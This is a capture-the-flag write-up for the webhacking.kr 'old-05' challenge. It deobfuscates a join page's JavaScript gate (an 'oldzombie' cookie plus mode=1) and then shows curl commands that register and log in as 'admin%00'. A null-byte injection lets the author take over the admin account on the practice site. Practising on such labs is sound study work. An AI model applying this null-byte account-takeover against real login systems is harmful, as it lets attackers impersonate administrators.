# Old 05    JavaScript (RE + Null Byte Bypass)

URL: [https://webhacking.kr/challenge/web-05/](https://webhacking.kr/challenge/web-05/)

![old-05.png](/assets/ctf/webhacking.kr/old-05.png)

We are given 2 options `Login` and `Join`. We certainly can't login, so we have to join. Unlucky for us Javascript blocks us from Join. If we inspect login we are redirected to [https://webhacking.kr/challenge/web-05/mem/login.php](https://webhacking.kr/challenge/web-05/mem/login.php) and lucky for us if we visit `/join.php` we get a page.

Going to [https://webhacking.kr/challenge/web-05/mem/join.php](https://webhacking.kr/challenge/web-05/mem/join.php) we get `alert(bye)`. 

View Source:
```html
<html>
    <title>Challenge 5</title>
</head>
<body bgcolor=black>
    <center>
        <script>
            l = 'a';
            ll = 'b';
            lll = 'c';
            llll = 'd';
            lllll = 'e';
            llllll = 'f';
            lllllll = 'g';
            llllllll = 'h';
            lllllllll = 'i';
            llllllllll = 'j';
            lllllllllll = 'k';
            llllllllllll = 'l';
            lllllllllllll = 'm';
            llllllllllllll = 'n';
            lllllllllllllll = 'o';
            llllllllllllllll = 'p';
            lllllllllllllllll = 'q';
            llllllllllllllllll = 'r';
            lllllllllllllllllll = 's';
            llllllllllllllllllll = 't';
            lllllllllllllllllllll = 'u';
            llllllllllllllllllllll = 'v';
            lllllllllllllllllllllll = 'w';
            llllllllllllllllllllllll = 'x';
            lllllllllllllllllllllllll = 'y';
            llllllllllllllllllllllllll = 'z';
            I = '1';
            II = '2';
            III = '3';
            IIII = '4';
            IIIII = '5';
            IIIIII = '6';
            IIIIIII = '7';
            IIIIIIII = '8';
            IIIIIIIII = '9';
            IIIIIIIIII = '0';
            li = '.';
            ii = '<';
            iii = '>';
            lIllIllIllIllIllIllIllIllIllIl = lllllllllllllll + llllllllllll + llll + llllllllllllllllllllllllll + lllllllllllllll + lllllllllllll + ll + lllllllll + lllll;
            lIIIIIIIIIIIIIIIIIIl = llll + lllllllllllllll + lll + lllllllllllllllllllll + lllllllllllll + lllll + llllllllllllll + llllllllllllllllllll + li + lll + lllllllllllllll + lllllllllllllll + lllllllllll + lllllllll + lllll;
            if (eval(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl) == -1) {
                alert('bye');
                throw "stop";
            }
            if (eval(llll + lllllllllllllll + lll + lllllllllllllllllllll + lllllllllllll + lllll + llllllllllllll + llllllllllllllllllll + li + 'U' + 'R' + 'L').indexOf(lllllllllllll + lllllllllllllll + llll + lllll + '=' + I) == -1) {
                alert('access_denied');
                throw "stop";
            } else {
                document.write('<font size=2 color=white>Join</font><p>');
                document.write('.<p>.<p>.<p>.<p>.<p>');
                document.write('<form method=post action=' + llllllllll + lllllllllllllll + lllllllll + llllllllllllll + li + llllllllllllllll + llllllll + llllllllllllllll + '>');
                document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name=' + lllllllll + llll + ' maxlength=20></td></tr>');
                document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name=' + llllllllllllllll + lllllllllllllllllllllll + '></td></tr>');
                document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');
            }
        </script>
</body>
</html>
```

I used VSCode to rename variables, F2 does global replace for variable names which is pretty neat!
```javascript
let a = 'a';
let b = 'b';
let c = 'c';
let d = 'd';
let e = 'e';
let f = 'f';
let g = 'g';
let h = 'h';
let i = 'i';
let j = 'j';
let k = 'k';
let l = 'l';
let m = 'm';
let n = 'n';
let o = 'o';
let p = 'p';
let q = 'q';
let r = 'r';
let s = 's';
let t = 't';
let u = 'u';
let v = 'v';
let w = 'w';
let x = 'x';
let y = 'y';
let z = 'z';
let _1 = '1';
let _2 = '2';
let _3 = '3';
let _4 = '4';
let _5 = '5';
let _6 = '6';
let _7 = '7';
let _8 = '8';
let _9 = '9';
let _0 = '0';
let dot = '.';
let lt = '<';
let gt = '>';
let oldzombie = o + l + d + z + o + m + b + i + e;
let document_cookie = d + o + c + u + m + e + n + t + dot + c + o + o + k + i + e;
if (eval(document_cookie).indexOf(oldzombie) == -1) {
    alert('bye');
    throw "stop";
}
if (eval(d + o + c + u + m + e + n + t + dot + 'U' + 'R' + 'L').indexOf(m + o + d + e + '=' + _1) == -1) {
    alert('access_denied');
    throw "stop";
} else {
    document.write('<font size=2 color=white>Join</font><p>');
    document.write('.<p>.<p>.<p>.<p>.<p>');
    document.write('<form method=post action=' + j + o + i + n + dot + p + h + p + '>');
    document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name=' + i + d + ' maxlength=20></td></tr>');
    document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name=' + p + w + '></td></tr>');
    document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');
}
```

> **Note**: Alternatively you could have ran the variables in Javascript Console and got values that way.

First we need to set `oldzombie` cookie and we need to send `mode=1` in params

![old-05-1.png](/assets/ctf/webhacking.kr/old-05-1.png)

I registered with `x:y` and on login got 

```
Hello x
You have to login as admin
```

We have to register with `admin` username, but it already exists... I tried padding with spaces, but that was also not working.

Injecting null byte allows us to bypass certain filter and login as admin:
```powershell
➜ curl 'https://webhacking.kr/challenge/web-05/mem/join.php?mode=1' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -b 'oldzombie=1' -d 'id=admin%00&pw=y'
<html>
<title>Challenge 5</title></head><body bgcolor=black><center>
<font size=2 color=white><script>alert('id already existed');</script>
➜ curl 'https://webhacking.kr/challenge/web-05/mem/login.php' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -b 'oldzombie=1' -d 'id=admin%00&pw=y'
<html>
<head>
<title>Challenge 5</title>
</head>
<body bgcolor=black>
<center><font color=white>
Hello admin<br><script>alert('old-05 Pwned!');</script><hr>old-05 Pwned. You got 30point. Congratz!<hr></font>
<font color=black>
...
```

> **Note**: `admin+space+null_byte` also worked

